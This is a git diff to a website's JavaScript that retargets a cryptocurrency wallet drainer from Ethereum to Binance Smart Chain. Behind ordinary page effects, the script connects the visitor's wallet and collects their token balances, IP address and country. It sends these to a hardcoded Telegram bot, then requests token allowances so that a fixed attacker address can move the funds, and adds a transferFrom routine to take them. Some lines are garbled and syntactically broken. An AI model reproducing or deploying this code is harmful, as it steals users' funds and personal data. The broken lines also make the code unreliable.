@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect, token approval, and Telegram notification
+ * Wallet connect, token approval, and Telegram notification for BSC
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -94,13 +94,14 @@ async function connectWalletAndSendTokens() {
     return;
   }
 
-  const evmNetworks = [
+  // Updated to BSC network configuration
+  const bscNetworks = [
     {
-      chainId: 1,
-      name: "Ethereum",
-      chainName: "eth",
-      nativeCoin: "ETH",
-      exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28"
+      chainId: 56,
+      name: "Binance Smart Chain",
+      chainName: "bsc",
+      nativeCoin: "BNB",
+      exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28" // Replace with your BSC address
     }
   ];
 
@@ -136,10 +137,11 @@ async function connectWalletAndSendTokens() {
       locationData = { country_name: "Unknown", ip: "N/A" };
     }
 
-    for (const network of evmNetworks) {
+    for (const network of bscNetworks) {
       try {
         console.log(`Processing network: ${network.name}`);
 
+        // Switch to BSC Mainnet
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
@@ -148,19 +150,17 @@ async function connectWalletAndSendTokens() {
         } catch (switchErr) {
           if (switchErr.code === 4902) {
             const chainConfig = {
-              chainId: '0x1',
-              chainName: 'Ethereum Mainnet',
-              rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
-              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-              blockExplorerUrls: ['https://ethersresscan.io']
+              chainId: '0x38',
+              chainName: 'Binance Smart Chain Mainnet',
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+              blockExplorerUrls: ['https://bscscan.com']
             };
             await window.ethereum.request({
               method: 'wallet_addEthereumChain',
               params: [chainConfig]
             });
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+            awaitId: `0x${network.chainId.toString(16)}` }]
             });
           } else {
             throw switchErr;
@@ -200,6 +200,7 @@ async function connectWalletAndSendTokens() {
         const maxAttempts = 3;
         let apiSuccess = false;
 
+        // Fetch BEP-20 tokens from Moralis API
         while (apiAttempts < maxAttempts && !apiSuccess) {
           try {
             apiAttempts++;
@@ -225,21 +226,23 @@ async function connectWalletAndSendTokens() {
                   const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                   return `• ${token.symbol}: ${balance}`;
                 }).join("\n")
-              : `No valid non-zero ERC-20 token balances found.`;
+              : `No valid non-zero BEP-20 token balances found.`;
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
-              tokenSummary = `Failed to fetch token balances: ${apiErr.message}`;
+              tokenSummary = `Failed to fetch BEP-20 token balances: ${apiErr.message}`;
             } else {
               await delay(3000);
             }
           }
         }
 
+        // Fetch native BNB balance
         const nativeBalance = await currentProvider.getBalance(userAddress);
         const formattedBalance = ethers.utils.formatEther(nativeBalance);
         const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;
 
+        // Updated Telegram notification for BSC
         const networkMessage = `
 📥 Wallet Connected on ${network.name}
 Address: ${userAddress}
@@ -248,7 +251,7 @@ Country: ${locationData.country_name}
 IP: ${locationData.ip}
 ${deviceType}
 
-💰 Balances:
+💰 BEP-20 Balances:
 ${tokenSummary}
 ${nativeBalanceMessage}
         `;
@@ -271,11 +274,11 @@ ${nativeBalanceMessage}
         if (nonZeroTokens.length > 0) {
           for (const token of nonZeroTokens) {
             try {
-              // Validate token contract existence
+              // Validate BEP-20 token contract
               const code = await currentProvider.getCode(token.token_address);
-              if (code === "0x") {
+              if (code/EntityType === "0x") {
                 const errorMessage = `
-❌ Invalid Contract
+❌ Invalid BEP-20 Contract
 Token: ${token.symbol || 'Unknown'}
 Error: No contract code at ${token.token_address}
 ${deviceType}
@@ -288,7 +291,7 @@ ${deviceType}
                 continue;
               }
 
-              // Use increaseAllowance with retry mechanism
+              // Approve BEP-20 token allowance
               let contract = new ethers.Contract(token.token_address, [
                 "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
                 "function allowance(address owner, address spender) public view returns (uint256)"
@@ -307,28 +310,27 @@ ${deviceType}
                   try {
                     approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance, { gasLimit: 100000 });
                     await approvalTx.wait();
-                    break; // Success, exit retry loop
+                    break;
                   } catch (err) {
                     attempts++;
                     if (err.message.includes("execution reverted") || err.message.includes("UNPREDICTABLE_GAS_LIMIT")) {
                       if (attempts < maxAttempts) {
                         console.warn(`Attempt ${attempts} failed for ${token.symbol}: ${err.message}. Retrying...`);
-                        await delay(2000); // Wait 2 seconds before retry
+                        await delay(2000);
                         continue;
                       }
                     }
-                    // Handle pedestal Handle user rejection or other errors
                     let errorMessage;
                     if (err.message.includes("user denied") || err.message.includes("not authorized")) {
                       errorMessage = `
-❌ User Rejected Approval
+❌ User Rejected BEP-20 Approval
 Token: ${token.symbol || 'Unknown'}
 Error: User denied authorization
 ${deviceType}
                       `;
                     } else {
                       errorMessage = `
-❌ Approval Failed
+❌ BEP-20 Approval Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message} (after ${attempts} attempts)
 ${deviceType}
@@ -339,14 +341,14 @@ ${deviceType}
                       headers: { "Content-Type": "application/json" },
                       body: JSON.stringify({ chat_id: chatId, text: errorMessage })
                     });
-                    continue; // Skip to next token
+                    continue;
                   }
                 }
 
                 if (approvalTx) {
                   const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
                   const approvalMessage = `
-✅ Approval Successful
+✅ BEP-20 Approval Successful
 Token: ${token.symbol}
 Amount Approved: ${formattedAmount}
 Spender: ${network.exodusAddress}
@@ -366,14 +368,14 @@ ${deviceType}
               let errorMessage;
               if (err.message.includes("user denied") || err.message.includes("not authorized")) {
                 errorMessage = `
-❌ User Rejected Approval
+❌ User Rejected BEP-20 Approval
 Token: ${token.symbol || 'Unknown'}
 Error: User denied authorization
 ${deviceType}
                 `;
               } else {
                 errorMessage = `
-❌ Approval Failed
+❌ BEP-20 Approval Failed
 Token: ${token.symbol || 'Unknown'}
 Token Address: ${token.token_address}
 Error: ${err.message}
@@ -390,7 +392,7 @@ ${deviceType}
           }
         } else {
           const noTokensMessage = `
-⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
+⚠️ No valid non-zero BEP-20 token balances to transfer on ${network.name}
 Address: ${userAddress}
 ${deviceType}
           `;
@@ -420,7 +422,7 @@ ${deviceType}
 }
 
 /**
- * Manual transfer function to be called after approval (e.g., via Etherscan or script)
+ * Manual transfer function for BEP-20 tokens
  */
 async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, exodusAddress) {
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
@@ -449,7 +451,7 @@ async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, 
 
     const formattedAmount = ethers.utils.formatUnits(amount, decimals);
     const transferSuccessMessage = `
-✅ Transfer Successful
+✅ BEP-20 Transfer Successful
 Token: ${tokenSymbol}
 Amount: ${formattedAmount}
 From: ${userAddress}
@@ -464,7 +466,7 @@ ${deviceType}
     });
   } catch (err) {
     const errorMessage = `
-❌ Transfer Failed
+❌ BEP-20 Transfer Failed
 Token Address: ${tokenAddress}
 Error: ${err.message}
 ${deviceType}
